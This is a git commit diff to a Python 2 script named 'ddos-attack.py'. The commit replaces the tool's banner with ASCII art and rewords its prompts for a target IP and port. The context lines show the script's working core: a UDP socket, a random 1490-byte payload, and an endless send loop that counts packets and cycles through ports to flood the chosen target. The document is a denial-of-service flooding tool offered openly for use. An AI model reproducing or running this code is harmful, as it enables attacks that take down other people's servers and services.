dd5d72a6243c223e2a22887c919bb8d626aee313
Sam Triky <75380938+SamDvl-07@users.noreply.github.com>
2021-02-16 15:18:22 +0100

    Update ddos-attack.py

--- ddos-attack.py
+++ ddos-attack.py
@@ -3,6 +3,7 @@ import os
 import time
 import socket
 import random
+#Code Time
 from datetime import datetime
 now = datetime.now()
 hour = now.hour
@@ -10,14 +11,26 @@ minute = now.minute
 day = now.day
 month = now.month
 year = now.year
+
+##############
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
+#############
 
 os.system("clear")
-os.system("figlet DDos Attack")
-print
-ip = raw_input("IP Target : ")
-port = input("Port       : ")
+
+print ''' 
+  _____   ____   _____           _______ _______       _____ _  __
+ |  __ \ / __ \ / ____|       /\|__   __|__   __|/\   / ____| |/ /
+ | |  | | |  | | (___ ______ /  \  | |     | |  /  \ | |    | ' / 
+ | |  | | |  | |\___ \______/ /\ \ | |     | | / /\ \| |    |  <  
+ | |__| | |__| |____) |    / ____ \| |     | |/ ____ \ |____| . \ 
+ |_____/ \____/|_____/    /_/    \_\_|     |_/_/    \_\_____|_|\_\
+                              
+                                                              
+                                                                  '''
+ip = raw_input("IP ? ")
+port = input("Port     ? ")
 
 os.system("clear")
 os.system("figlet Attack Starting")
@@ -39,4 +52,3 @@ while True:
      print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
      if port == 65534:
        port = 1
-
